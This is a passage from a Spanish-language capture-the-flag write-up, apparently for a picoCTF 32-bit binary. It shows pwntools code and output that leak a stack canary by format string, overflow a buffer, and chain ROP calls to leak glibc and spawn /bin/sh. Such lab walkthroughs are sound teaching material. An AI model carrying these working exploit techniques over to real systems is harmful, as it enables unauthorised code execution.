<span class=mtk1>number</span> <span class=mtk5>=</span> <span class=mtk5>-</span><span class=mtk6>3423</span>  <span class=mtk3>#</span> <span class=mtk3>-</span> <span class=mtk3>((~0xfffff2a1</span> <span class=mtk3>&amp;</span> <span class=mtk3>0xffffffff)</span> <span class=mtk3>+</span> <span class=mtk3>1)</span>
<span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>success</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Guessed</span> <span class=mtk4>number:</span> <span class=mtk6>{</span><span class=mtk1>number</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

<span class=mtk1>p</span> <span class=mtk5>=</span> <span class="mtk8 mtku">process</span><span class=mtk1>(</span><span class="mtk8 mtku">elf</span><span class=mtk1>.</span><span class=mtk1>path</span><span class=mtk1>)</span>

<span class="mtk7 mtki">def</span> <span class=mtk8>dump</span><span class=mtk1>(</span><span class="mtk9 mtki">n</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span><span class=mtk1>)</span> <span class=mtk1>-&gt;</span> <span class="mtk8 mtku">str</span><span class=mtk1>:</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'What</span> <span class=mtk4>number</span> <span class=mtk4>would</span> <span class=mtk4>you</span> <span class=mtk4>like</span> <span class=mtk4>to</span> <span class=mtk4>guess?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class=mtk1>number</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>  
    <span class=mtk1>p.</span><span class=mtk8>sendlineafter</span>(<span class="mtk7 mtki">b</span><span class=mtk4>'Name?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">f</span><span class=mtk4>'%</span><span class=mtk6>{</span><span class=mtk1>n</span><span class=mtk6>}</span><span class=mtk4>$x'</span><span class=mtk1>.</span><span class=mtk8>encode</span><span class=mtk1>())</span>
    <span class=mtk1>res</span> <span class=mtk5>=</span> <span class=mtk1>p.</span><span class=mtk8>recvline</span>().<span class=mtk8>decode</span>().<span class=mtk8>strip</span><span class=mtk1>()</span>
    <span class=mtk1>res</span> <span class=mtk5>=</span> <span class=mtk1>res.</span><span class=mtk8>lstrip</span>(<span class=mtk4>'Congrats:</span> <span class=mtk4>'</span><span class=mtk1>)</span>
    <span class=mtk5>return</span> <span class=mtk1>res</span>

<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>200</span><span class=mtk1>):</span>
    <span class=mtk1>res</span> <span class=mtk5>=</span> <span class=mtk8>dump</span><span class=mtk1>(</span><span class=mtk1>i</span><span class=mtk1>)</span>

    <span class=mtk5>if</span> <span class=mtk1>res</span><span class=mtk1>.</span><span class=mtk8>endswith</span><span class=mtk1>(</span><span class=mtk4>'00'</span><span class=mtk1>):</span>
        <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>i</span><span class=mtk1>,</span> <span class=mtk8>dump</span><span class=mtk1>(</span><span class=mtk1>i</span><span class=mtk1>))</span>

<span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
</code></pre></div><p>Básicamente estamos extrayendo valores en una determinada posición utilizando formatos como <code>%1$x</code>, <code>%2$x</code>, <code>%3$x</code>, etc. Si probamos con las primeras 200 posiciones y seleccionamos los candidatos a <code>canary</code> (los que terminan en <code>00</code>), tenemos que el canario está probablemente en la posición 119 (y también en la 135):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Guessed number: -3423
[<span class=code-green>+</span>] Starting local process './vuln': pid 64957  
1 200
23 f7f22100
31 f7f55000
95 f7f0c000
119 b45b6d00
124 f7f0c000
125 f7f0c000
132 f7f0c000
133 f7f0c000
135 b45b6d00
148 f7f0c000
149 f7f0c000
156 f7f0c000
157 f7f55000
162 f7f0c000
163 f7f0c000
184 8048900
[<span class=code-blue>*</span>] Stopped process './vuln' (pid 64957)
</code></pre></div><p>Comprobemos el valor con GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q vuln
Reading symbols from <span class=code-dark-green>vuln</span>...
(No debugging symbols found in <span class=code-dark-green>vuln</span>)  
<span class=code-red>gef➤</span>  break main
Breakpoint 1 at <span class=code-dark-blue>0x804880e</span>
<span class=code-green>gef➤</span></span>  run
Starting program: ./vuln

Breakpoint 1, <span class=code-dark-blue>0x804880e</span> in <span class=code-dark-yellow>main</span> ()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  canary
<span class=code-blue>[+]</span> Found AT_RANDOM at 0xffffda2b, reading 4 bytes
<span class=code-blue>[+]</span> The canary of process 71318 is 0x3ce1fa00
<span class=code-green>gef➤</span>  continue
Continuing.
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-3423
Congrats! You win! Your prize is this print statement!  

New winner!
Name? %119$x
Congrats: 3ce1fa00

What number would you like to guess?
</code></pre></div><p>Todo bien, ahora podemos comenzar a explotar el <em>Buffer Overflow</em>. Primero de todo, necesitamos obtener el número de bytes necesario para sobresceibir <code>$eip</code>. Esto se puede hacer de varias formas porque tenemos un <em>stack canary</em>. Por el momento, vamos a mandar <em>payloads</em> y aumentar su tamaño hasta que el proceso termine:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>canary_position</span> <span class=mtk5>=</span> <span class=mtk6>119</span>
<span class=mtk1>canary</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk8>dump</span>(<span class=mtk1>canary_position</span><span class=mtk1>),</span> <span class=mtk6>16</span><span class=mtk1>)</span>

<span class=mtk1>log.</span><span class=mtk8>success</span>(<span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>canary:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>canary</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

<span class="mtk7 mtki">def</span> <span class=mtk8>send_payload</span><span class=mtk1>(</span><span class="mtk9 mtki">payload</span><span class=mtk1>:</span> <span class="mtk8 mtku">bytes</span><span class=mtk1>)</span> <span class=mtk1>-&gt;</span> <span class="mtk8 mtku">bytes</span><span class=mtk1>:</span>
    <span class=mtk1>p.</span><span class=mtk8>sendlineafter</span>(<span class="mtk7 mtki">b</span><span class=mtk4>'What</span> <span class=mtk4>number</span> <span class=mtk4>would</span> <span class=mtk4>you</span> <span class=mtk4>like</span> <span class=mtk4>to</span> <span class=mtk4>guess?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(number).</span><span class=mtk8>encode</span><span class=mtk1>())</span>  
    <span class=mtk1>p.<span class=mtk8>sendlineafter</span>(<span class="mtk7 mtki">b</span><span class=mtk4>'Name?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">payload</span><span class=mtk1>)</span>
    <span class=mtk5>return</span> <span class=mtk1>p.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>

<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>250</span><span class=mtk1>):</span>
    <span class=mtk5>try</span><span class=mtk1>:</span>
        <span class=mtk8>send_payload</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk6>4</span> <span class=mtk5>*</span> <span class=mtk1>i</span><span class=mtk1>)</span>
    <span class=mtk5>except</span> <span class="mtk8 mtku">EOFError</span><span class=mtk1>:</span>
        <span class=mtk1>log.</span><span class=mtk8>info</span>(<span class="mtk7 mtki">f</span><span class=mtk4>'Stack</span> <span class=mtk4>smashing</span> <span class=mtk4>detected</span> <span class=mtk4>with</span> <span class=mtk6>{4</span> <span class=mtk5>*</span> <span class=mtk1>i</span> <span class=mtk5>-</span> <span class=mtk6>4}</span> <span class=mtk4>bytes'</span><span class=mtk1>)</span>
        <span class=mtk5>break</span>

<span class=mtk1>p.</span><span class=mtk8>close</span><span class=mtk1>()</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Guessed number: -3423
[<span class=code-green>+</span>] Starting local process './vuln': pid 83225
[<span class=code-green>+</span>] Leaked canary: 0x330c2500
[<span class=code-blue>*</span>] Stack smashing detected with 516 bytes
[<span class=code-blue>*</span>] Process './vuln' stopped with exit code -6 (SIGABRT) (pid 83225)  
</code></pre></div><p>Entonces, se detecta el <em>stack smashing</em> al enviar 516 bytes. Por tanto, necesitamos 512 bytes para llegar al <em>stack canary</em>.</p><p>Nótese que se detecta el <em>stack smashing</em> en la iteración previa a la que da <code>EOFError</code> (que significa que el proceso ya no está vivo).</p><p>Ahora, podemos añadir el canario en el <em>payload</em> y enviar un patrón mediante <code>cyclic</code> de <code>pwntools</code>. Después, podemos adjuntar GDB al proceso y calcular el <em>offset</em> hasta <code>$eip</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">def</span> <span class=mtk8>send_payload</span><span class=mtk1>(</span><span class="mtk9 mtki">payload</span><span class=mtk1>:</span> <span class="mtk8 mtku">bytes</span><span class=mtk1>)</span> <span class=mtk1>-&gt;</span> <span class="mtk8 mtku">bytes</span><span class=mtk1>:</span>
    <span class=mtk1>p.</span><span class=mtk8>sendlineafter</span>(<span class="mtk7 mtki">b</span><span class=mtk4>'What</span> <span class=mtk4>number</span> <span class=mtk4>would</span> <span class=mtk4>you</span> <span class=mtk4>like</span> <span class=mtk4>to</span> <span class=mtk4>guess?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(number).</span><span class=mtk8>encode</span><span class=mtk1>())</span>  
    <span class=mtk1>p.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Name?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">payload</span><span class=mtk1>)</span>
    <span class=mtk5>return</span> <span class=mtk1>p.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>

<span class=mtk1>offset</span> <span class=mtk5>=</span> <span class=mtk6>512</span>
<span class=mtk1>junk</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>

<span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(canary)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>cyclic</span><span class=mtk1>(</span><span class=mtk6>500</span><span class=mtk1>)</span>

<span class=mtk1>gdb.</span><span class=mtk8>attach</span><span class=mtk1>(p,</span> <span class="mtk9 mtki">gdbscript</span><span class=mtk5>=</span><span class=mtk4>'continue'</span><span class=mtk1>)</span>

<span class=mtk8>send_payload</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>)</span>

<span class=mtk1>p.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Program received signal SIGSEGV, Segmentation fault.  
<span class=code-dark-blue>0x61616164</span> in <span class=code-dark-yellow>??</span> ()
</code></pre></div><p>El registro <code>$eip</code> se sobrescribe con <code>0x61616164</code> (<code>daaa</code>), que resulta en un <em>offset</em> de 12:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic -l 0x61616164  
12
</code></pre></div><p>Ahora, necesitamos crear una ROP <em>chain</em> para efectuar un Ret2Libc, ya que el binario está enlazado dinámicamente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ldd</span> vuln
        linux-gate.so.1 (0xf7efb000)
        libc.so.6 => /lib32/libc.so.6 (0xf7cf9000)  
        /lib/ld-linux.so.2 (0xf7efd000)
</code></pre></div><p>Como no sabemos la versión de Glibc de la instancia remota, debemos fugar una dirección de una función de Glibc para buscar su <em>offset</em> en una base de datos de Glibc.</p><p>Para realizar la fuga (<em>leak</em>), podemos llamar a <code>puts</code> en la PLT y fugar el contenido de una dirección de la GOT, por ejemplo la misma función <code>puts</code>. La dirección de retorno será la dirección de <code>win</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q vuln
Reading symbols from <span class=code-dark-green>vuln</span>...
(No debugging symbols found in <span class=code-dark-green>vuln</span>)
<span class=code-red>gef➤</span>  p puts
$1 = {&lt;text variable, no debug info&gt;} <span class=code-dark-blue>0x80484c0</span> <<span class=code-dark-yellow>puts@plt</span>>
<span class=code-red>gef➤</span>  p win
$1 = {&lt;text variable, no debug info&gt;} <span class=code-dark-blue>0x804876e</span> <<span class=code-dark-yellow>win</span>>
<span class=code-red>gef➤</span>  quit

<span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -a vuln | <span class=code-dark-green>grep</span> puts
08049fdc  00000607 R_386_JUMP_SLOT   00000000   <span class=code-red>puts</span>@GLIBC_2.0
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND <span class=code-red>puts</span>@GLIBC_2.0 (2)  
    55: 00000000     0 FUNC    GLOBAL DEFAULT  UND <span class=code-red>puts</span>@@GLIBC_2.0
</code></pre></div><p>Por tanto, la ROP <em>chain</em> es:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>offset_to_canary</span> <span class=mtk5>=</span> <span class=mtk6>512</span>
<span class=mtk1>offset_to_eip</span> <span class=mtk5>=</span> <span class=mtk6>12</span>

<span class=mtk1>junk_to_canary</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset_to_canary</span>  
<span class=mtk1>junk_to_eip</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset_to_eip</span>

<span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk_to_canary</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(canary)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>junk_to_eip</span>

<span class=mtk1>win_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>0804876e</span>
<span class=mtk1>puts_plt</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>080484c0</span>
<span class=mtk1>puts_got</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>08049fdc</span>

<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>puts_plt</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>win_addr</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>puts_got</span><span class=mtk1>)</span>

<span class=mtk8>send_payload</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>)</span>
</code></pre></div><p>Después, lo que recibiremos será la dirección real de <code>puts</code> en Glibc (que tiene 4 bytes de longitud):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>p.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>
<span class=mtk1>puts_addr</span> <span class=mtk5>=</span> <span class=mtk1>u32(p.</span><span class=mtk8>recvline</span><span class=mtk1>()[:</span><span class=mtk6>4</span><span class=mtk1>].</span><span class=mtk8>ljust</span><span class=mtk1>(</span><span class=mtk6>4</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>))</span>

<span class=mtk1>log.</span><span class=mtk8>success</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>puts()</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>puts_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  
</code></pre></div><p>Hemos fugado este valor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Guessed number: -3423
[<span class=code-green>+</span>] Starting local process './vuln': pid 148404  
[<span class=code-green>+</span>] Leaked canary: 0x3463de00
[<span class=code-green>+</span>] Leaked puts() address: 0xf7d73290
[<span class=code-blue>*</span>] Switching to interactive mode
New winner!
Name? <span class=code-red>$</span>
</code></pre></div><p>Nótese también que se ha llamado a <code>win</code> correctamente. Para comprobar que la dirección fugada es correcta, podemos obtener el <em>offset</em> de <code>puts</code> en Glibc (la local, más tarde para la instancia remota):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib32/libc.so.6 | <span class=code-dark-green>grep</span> puts
   215: 00071290   531 FUNC    GLOBAL DEFAULT   16 _IO_<span class=code-red>puts</span>@@GLIBC_2.0
   461: 00071290   531 FUNC    WEAK   DEFAULT   16 <span class=code-red>puts</span>@@GLIBC_2.0
   540: 0010c050  1240 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>pent@@GLIBC_2.0
   737: 0010dc90   742 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>gent@@GLIBC_2.10
  1244: 0006fa20   381 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>@@GLIBC_2.0
  1831: 0006fa20   381 FUNC    GLOBAL DEFAULT   16 _IO_f<span class=code-red>puts</span>@@GLIBC_2.0
  2507: 0007ac20   191 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>_unlocked@@GLIBC_2.1  
</code></pre></div><p>El <em>offset</em> es <code>0x71290</code>, y la dirección fugada es <code>0xf7d73290</code>. Ambos números terminan en <code>290</code> en hexadecimal, por lo que todo está bien. La dirección base de Glibc es aleatoria debido a ASLR, pero sabemos que esta dirección terminará en <code>000</code> en hexadecimal, por lo que la dirección real de <code>puts</code> terminará con los tres últimos dígitos hexadecimales de su <em>offset</em> (<code>290</code>).</p><p>Para calcular la dirección base de Glibc, podemos realizar una simple resta:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>p.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>
<span class=mtk1>puts_addr</span> <span class=mtk5>=</span> <span class=mtk1>u32(p.</span><span class=mtk8>recvline</span><span class=mtk1>()[:</span><span class=mtk6>4</span><span class=mtk1>].</span><span class=mtk8>ljust</span><span class=mtk1>(</span><span class=mtk6>4</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>))</span>

<span class=mtk1>log.</span><span class=mtk8>success</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>puts()</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>puts_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

<span class=mtk1>puts_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>71290</span>
<span class=mtk1>glibc_base_addr</span> <span class=mtk5>=</span> <span class=mtk1>puts_addr</span> <span class=mtk5>-</span> <span class=mtk1>puts_offset</span>

<span class=mtk1>log.success(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Glibc</span> <span class=mtk4>base</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>glibc_base_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Guessed number: -3423
[<span class=code-green>+</span>] Starting local process './vuln': pid 154121  
[<span class=code-green>+</span>] Leaked canary: 0xf0f7ba00
[<span class=code-green>+</span>] Leaked puts() address: 0xf7d9d290
[<span class=code-green>+</span>] Glibc base address: 0xf7d2c000
[<span class=code-blue>*</span>] Switching to interactive mode
New winner!
Name? <span class=code-red>$</span>
</code></pre></div><p>Ahora podemos efectuar el Ret2Libc. Básicamente, tenemos que llamar a <code>system</code> en Glibc y utilizar <code>"/bin/sh"</code> como argumento. La cadena <code>"/bin/sh"</code> también se encuentra en Glibc:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib32/libc.so.6 | <span class=code-dark-green>grep</span> system
   258: 00137810   106 FUNC    GLOBAL DEFAULT   16 svcerr_<span class=code-red>system</span>err@@GLIBC_2.0
   662: 00045420    63 FUNC    GLOBAL DEFAULT   16 __libc_<span class=code-red>system</span>@@GLIBC_PRIVATE  
  1534: 00045420    63 FUNC    WEAK   DEFAULT   16 <span class=code-red>system</span>@@GLIBC_2.0

<span class=code-cyan>$</span> <span class=code-dark-green>strings</span> -atx /lib32/libc.so.6 | <span class=code-dark-green>grep</span> /bin/sh
 18f352 <span class=code-red>/bin/sh</span>
</code></pre></div><p>Esta es la segunda ROP <em>chain</em>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk_to_canary</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(canary)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>junk_to_eip</span>

<span class=mtk1>system_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>45420</span>
<span class=mtk1>bin_sh_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>18f352</span>

<span class=mtk1>system_addr</span> <span class=mtk5>=</span> <span class=mtk1>glibc_base_addr</span> <span class=mtk5>+</span> <span class=mtk1>system_offset</span>  
<span class=mtk1>bin_sh_addr</span> <span class=mtk5>=</span> <span class=mtk1>glibc_base_addr</span> <span class=mtk5>+</span> <span class=mtk1>bin_sh_offset</span>

<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>system_addr</span><span class=mtk1>)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(win_addr)</span>
<span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>bin_sh_addr</span><span class=mtk1>)</span>

<span class=mtk1>p.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Name?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
<span class=mtk1>p.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>
<span class=mtk1>p.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>

<span class=mtk1>p.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>
</code></pre></div><p>Y si todo es correcto, deberíamos tener una consola interactiva:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Guessed number: -3423
[<span class=code-green>+</span>] Starting local process './vuln': pid 159500  
[<span class=code-green>+</span>] Leaked canary: 0x7baaa300
[<span class=code-green>+</span>] Leaked puts() address: 0xf7d8b290
[<span class=code-green>+</span>] Glibc base address: 0xf7d1a000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
Makefile  solve.py  vuln  vuln.c
</code></pre></div><p>Ahora es el momento de obtener la versión de Glibc en la instancia remota.</p><p>Lo primero que notamos es que el número -3423 no es correcto para la instancia remota. Por tanto, tenemos que realizar un ataque de fuerza bruta, ya que no podemos extraerlo:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>number</span> <span class=mtk5>=</span> <span class=mtk6>0</span>
<span class=mtk1>number_progress</span> <span class=mtk5>=</span> <span class=mtk1>log.</span><span class=mtk8>progress</span><span class=mtk1>(</span><span class=mtk4>'Guessed</span> <span class=mtk4>number'</span><span class=mtk1>)</span>

<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>4096</span><span class=mtk1>,</span> <span class=mtk6>4095</span><span class=mtk1>):</span>
    <span class=mtk1>number_progress</span><span class=mtk1>.</span><span class=mtk8>status</span><span class=mtk1>(</span><span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class=mtk1>i</span><span class=mtk1>))</span>

    <span class=mtk5>with</span> <span class=mtk1>context.</span><span class=mtk8>local</span><span class=mtk1>(</span><span class="mtk9 mtki">log_level</span><span class=mtk5>=</span><span class=mtk4>'CRITICAL'</span><span class=mtk1>):</span>
        <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>
        <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'What</span> <span class=mtk4>number</span> <span class=mtk4>would</span> <span class=mtk4>you</span> <span class=mtk4>like</span> <span class=mtk4>to</span> <span class=mtk4>guess?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class=mtk1>i</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>  

        <span class=mtk5>if</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Congrats!'</span> <span class=mtk5>in</span> <span class=mtk1>p.</span><span class=mtk8>recvline</span><span class=mtk1>():</span>
            <span class=mtk1>number</span> <span class=mtk5>=</span> <span class=mtk1>i</span>
            <span class=mtk1>number_progress</span><span class=mtk1>.</span><span class=mtk8>success</span><span class=mtk1>(</span><span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class=mtk1>number</span><span class=mtk1>))</span>
            <span class=mtk5>break</span>

        <span class=mtk1>p.</span><span class=mtk8>close</span>()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py jupiter.challenges.picoctf.org 15815  
[<span class=code-blue>|</span>] Guessing number: -3983
[<span class=code-green>+</span>] Guessed number: -3983
